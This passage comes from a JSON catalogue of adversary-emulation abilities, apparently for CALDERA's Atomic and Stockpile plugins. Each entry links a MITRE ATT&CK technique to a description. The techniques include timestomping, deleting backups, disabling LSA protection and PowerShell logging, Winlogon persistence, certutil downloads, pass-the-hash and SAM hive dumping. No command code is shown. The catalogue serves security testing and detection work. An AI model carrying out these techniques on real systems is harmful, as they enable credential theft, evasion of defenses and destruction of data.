        "plugin": "atomic",
        "ability_id": "e2ef55e9867a99e2f056a73c041c1d7e",
        "technique_id": "T1070.006",
        "repeatable": false
    },
    {
        "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Timestomp",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Modify file last modified timestamp with PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b3e9f59599e24e318d7a5292c2830362",
        "technique_id": "T1070.006",
        "repeatable": false
    },
    {
        "description": "Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Destruction",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Overwrite file with Sysinternals SDelete",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "7b782764b73290661c9fe187a3a92a12",
        "technique_id": "T1485",
        "repeatable": false
    },
    {
        "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - PowerShell Download",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "a88b5c13a1d5d6bdf02b66bc73411f41",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Service Stop",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Stop service by killing process",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "fb5a68924b414467360a1a3550bd0fa2",
        "technique_id": "T1489",
        "repeatable": false
    },
    {
        "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Service Stop",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Stop service using Service Controller",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "6b666245c021b73f91449ae08a581eaf",
        "technique_id": "T1489",
        "repeatable": false
    },
    {
        "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Service Stop",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Stop service using net.exe",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "61a3e3faa588f1946a659139d6fd7a18",
        "technique_id": "T1489",
        "repeatable": false
    },
    {
        "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Timestomp",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Timestomp a File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3e78ff779dd7bfc558ae0e4d5319efcc",
        "technique_id": "T1070.006",
        "repeatable": false
    },
    {
        "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - wbadmin Delete Windows Backup Catalog",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "9e5e4c0655fd1b5be88bd40b8251175f",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - wbadmin Delete systemstatebackup",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "8af540e33bedd20ad6122751d2c996a2",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Add Registry Value to Load Service in Safe Mode with Network",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c228f0926d39e1ed5cfe8343adc1e684",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Add Registry Value to Load Service in Safe Mode without Network",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6e8a2c8f187fcca7926bfc95f72ee048",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Auto Update Option to Notify before download",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c0d2e758c07d1ecb991ac940c3b6db73",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "The following Atomic adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Disable LSA Protection",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c7ec84be7b5a6e587c6a227da1e7b6c7",
        "technique_id": "T1562",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows HideSCAHealth Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "81c44eaf44a1fd04ef7bde11f64ac8bc",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows HideSCANetwork Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3dcf8448a2a037af9d52abdc4199094f",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows HideSCAPower Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3ac22c2973506d82eae54d914e69b193",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows HideSCAVolume Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3c36afcd68b8139b52e7399c41e30959",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Internal Packet Capture",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6881a4589710d53f0c146e91db513f01",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Internal pktmon capture",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6623d6925383b47a30d6c7e5e8c4d752",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Internal pktmon set filter",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d9c719f978740efa1ed6db8fbc749706",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows MOFComp.exe Load MOF File",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "353949fcc1528656830ece93878589cb",
        "technique_id": "T1546.003",
        "repeatable": false
    },
    {
        "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows MachineGUID Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "98c8abc9362d5a3da76d23980572b5e2",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Modify Show Compress Color And Info Tip Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2ecf1916a791a659495a9b8a9367b996",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Powershell Logging Disabled",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "350c23947232688eeda9b7b2511732f5",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Screen Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Screen Capture (CopyFromScreen)",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "64569d9eb87191fc3cbf365a656e31ab",
        "technique_id": "T1113",
        "repeatable": false
    },
    {
        "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Screen Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows Screencapture",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "582871bcbf9a88caed89ae25d76d018c",
        "technique_id": "T1113",
        "repeatable": false
    },
    {
        "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Winlogon HKLM Shell Key Persistence - PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "dc74af5b90b9cbb4dcfbcaaa3e412a5e",
        "technique_id": "T1547.004",
        "repeatable": false
    },
    {
        "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Winlogon HKLM Userinit Key Persistence - PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "92578413245a3418c9dc21dc5db784ff",
        "technique_id": "T1547.004",
        "repeatable": false
    },
    {
        "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Winlogon Notify Key Logon Persistence - PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6c2b844d6dcbe8b2c527dca7fe49a8d9",
        "technique_id": "T1547.004",
        "repeatable": false
    },
    {
        "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Winlogon Shell Key Persistence - PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7cd5d1852fb4a534fa9b735288ca158f",
        "technique_id": "T1547.004",
        "repeatable": false
    },
    {
        "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Winlogon Userinit Key Persistence - PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5c23188ed301af9f1b6b55d4f3f60b46",
        "technique_id": "T1547.004",
        "repeatable": false
    },
    {
        "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Wmic Group Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "53f5c5712bf6c008a24c38fe60700d2e",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n",
        "buckets": [
            "initial-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Phishing: Spearphishing Attachment",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Word spawned a command shell and used an IP address in the command line",
        "tactic": "initial-access",
        "plugin": "atomic",
        "ability_id": "0a69420bec84b02bd47464f6835653b1",
        "technique_id": "T1566.001",
        "repeatable": false
    },
    {
        "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Writes text to a file and displays it.",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "e0d7856bf28741789ecf1e0654d96995",
        "technique_id": "T1059.003",
        "repeatable": false
    },
    {
        "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Encoding: Standard Encoding",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "XOR Encoded data.",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "5fd6b6b635191898a202dc7c21aa6068",
        "technique_id": "T1132.001",
        "repeatable": false
    },
    {
        "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Zip a Folder with PowerShell for Staging in Temp",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "00fd3b04d79d701df0900529c1006c62",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "`SeDebugPrivilege` token duplication",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ae73a53476995f46b71f11709f525319",
        "technique_id": "T1134.001",
        "repeatable": false
    },
    {
        "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "attrib - Remove read-only attribute",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5d426eb0a666aec389a212616662c66d",
        "technique_id": "T1222.001",
        "repeatable": false
    },
    {
        "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "attrib - hide file",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d26a4798efaecdb29af1b400aa847ef3",
        "technique_id": "T1222.001",
        "repeatable": false
    },
    {
        "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "cacls - Grant permission to specified user or group recursively",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "69a1361f277efe9bade299f0c0a01b7a",
        "technique_id": "T1222.001",
        "repeatable": false
    },
    {
        "description": "Use certreq to download a file from the web",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "certreq download",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "a268a831389fc0be60eefa838ccf80e0",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "certutil download (urlcache)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "1daded6839d3954bf7d12b34eb36a1b3",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "certutil download (verifyctl)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "2ed8948f1c1156af47d50379e7965d90",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "User enumeration",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "cmd.exe information gathering",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "55678719-e76e-4df9-92aa-10655bbd1cf4",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "command execute with crackmapexec\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Use Alternate Authentication Material: Pass the Hash",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "crackmapexec Pass the Hash",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "3e08ce272958e39325d1a9f4a2b71bda",
        "technique_id": "T1550.002",
        "repeatable": false
    },
    {
        "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "dump volume shadow copy hives with System.IO.File",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "69219b448ba0a75bae573d58d8b6cf40",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "dump volume shadow copy hives with certutil",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e11194c092261fb1a60c378aa8788e15",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "UIPI bypass with uiAccess application",
        "buckets": [
            "privilege-escalation"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "duser/osksupport DLL Hijack",
        "tactic": "privilege-escalation",
        "plugin": "stockpile",
        "ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
